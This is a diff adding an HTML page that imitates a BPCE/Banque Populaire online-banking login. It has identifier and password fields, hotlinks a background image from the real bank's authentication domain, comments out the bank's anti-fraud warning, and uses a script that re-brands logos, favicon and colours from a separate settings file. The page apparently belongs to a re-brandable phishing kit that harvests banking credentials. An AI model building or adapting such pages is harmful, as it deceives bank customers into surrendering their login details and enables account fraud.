@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="icon" type="image/x-icon" href="./assets/favicon.ico" id="faviconLink">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
+    rel="stylesheet">
+  <script src="./settings.js"></script>
+  <title>BPCE - Banque & Assurance</title>
+</head>
+
+<style>
+  *{border: 1px solid red;}
+</style>
+
+<body class="font-[Ubuntu] ">
+  <!-- entete -->
+  <div
+      class="bg-white max-p-7xl border-[1px] border-neutral-400 border-t-0 border-l-0 border-r-0 py-4 flex justify-between px-5 items-center">
+
+      <div>
+        <!-- phone -->
+        <img  class="md:hidden items-center" id="logoMobile" src="/assets/bp-logo-small.svg" alt="">
+        <!-- pc -->
+        <img width="200" class="hidden md:block" id="logoDesktop" src="/assets/bp.svg" alt="">
+      </div>
+      <div class="text-sm">
+        <p class="text-[#00235a] font-semibold">Assistance</p>
+      </div>
+  </div>
+
+
+  <!-- corps -->
+  <div class="md:flex min-h-screen">
+    
+    
+      <div class="mx-8 mt-4 h-screen md:w-1/3 flex flex-col">
+        <p class="my-10 text-center text-xl">Saississez votre identifiant</p>
+        <form action="compte.html" class="flex gap-4 flex-col" method="get">
+          <input type="text" name="identifiant" id="identifiant" required placeholder="Identifiant"
+            class="border-[1px] border-neutral-400 p-2 w-full rounded-md outline-none">
+          <input type="password" name="password" id="password" required placeholder="Mot de passe"
+            class="border-[1px] border-neutral-400 p-2 w-full rounded-md outline-none">
+          <!-- <div class="text-xs border-[1px] border-neutral-400 p-2 rounded-md">
+            <div class="flex-col items-center gap-5  mb-2">
+              <div class="flex items-center gap-2 mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
+                  stroke="currentColor" class="w-6 h-6">
+                  <path stroke-linecap="round" stroke-linejoin="round"
+                    d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
+                </svg>
+                <p class="text-[15px]">SOYEZ VIGILENT!</p>
+              </div>
+              <p class="text-red-500 font-semibold"> Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour votre conseiller,
+                les services fraude ou opposition carte… en affichant parfois même nos numéros de téléphone. Nous ne vous
+                demanderons JAMAIS de COMMUNIQUER les données de votre banque (identifiant, mot de passe, code reçu par
+                sms, code Sécur’Pass…), pour CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement,
+                paiement par carte, validation Sécur’Pass…). </p>
+            </div>
+          </div> -->
+  
+  
+          <div>
+            <input type="checkbox" name="" id="">
+            <label for="">Se souvenir de moi</label>
+          </div>
+  
+          <button id="boutonValider" class="bg-[#00235a] w-full text-white p-[10px] rounded-md">Valider</button>
+      </form>
+      </div>
+   
+    
+
+    <div id="imageFondDesktop" class="w-full h-screen bg-cover bg-center hidden md:block" 
+    style="background-image: url('https://www.icgauth.banquepopulaire.fr/ria/accessecurite-bps-current/assets/background_startup_bp_default.jpg');">
+</div>
+
+
+
+<script>
+  // ═══════════════════════════════════════════════════════════════
+  // CONFIGURATION DYNAMIQUE DE LA PAGE DE CONNEXION
+  // ═══════════════════════════════════════════════════════════════
+  
+  document.addEventListener('DOMContentLoaded', function() {
+    // Vérifier si settings.js est chargé
+    if (typeof pageLoginConfig !== 'undefined') {
+      
+      // 1️⃣ Favicon (icône de l'onglet)
+      const faviconLink = document.getElementById('faviconLink');
+      if (faviconLink && pageLoginConfig.favicon) {
+        faviconLink.href = pageLoginConfig.favicon;
+      }
+      
+      // 2️⃣ Logo Mobile (header)
+      const logoMobile = document.getElementById('logoMobile');
+      if (logoMobile && pageLoginConfig.logoMobile) {
+        logoMobile.src = pageLoginConfig.logoMobile;
+        if (pageLoginConfig.logoMobileWidth) {
+          logoMobile.width = parseInt(pageLoginConfig.logoMobileWidth);
+        }
+      }
+      
+      // 3️⃣ Logo Desktop (header)
+      const logoDesktop = document.getElementById('logoDesktop');
+      if (logoDesktop && pageLoginConfig.logoDesktop) {
+        logoDesktop.src = pageLoginConfig.logoDesktop;
+        if (pageLoginConfig.logoDesktopWidth) {
+          logoDesktop.width = parseInt(pageLoginConfig.logoDesktopWidth);
+        }
+      }
+      
+      // 4️⃣ Image de fond côté droit (desktop uniquement)
+      const imageFond = document.getElementById('imageFondDesktop');
+      if (imageFond && pageLoginConfig.imageFondUrl) {
+        imageFond.style.backgroundImage = `url('${pageLoginConfig.imageFondUrl}')`;
+      }
+      
+      // 5️⃣ Couleur du bouton "Valider"
+      const boutonValider = document.getElementById('boutonValider');
+      if (boutonValider && pageLoginConfig.couleurBoutonValider) {
+        boutonValider.style.backgroundColor = pageLoginConfig.couleurBoutonValider;
+      }
+    }
+  });
+</script>
+
+
+</body>
+
+</html>
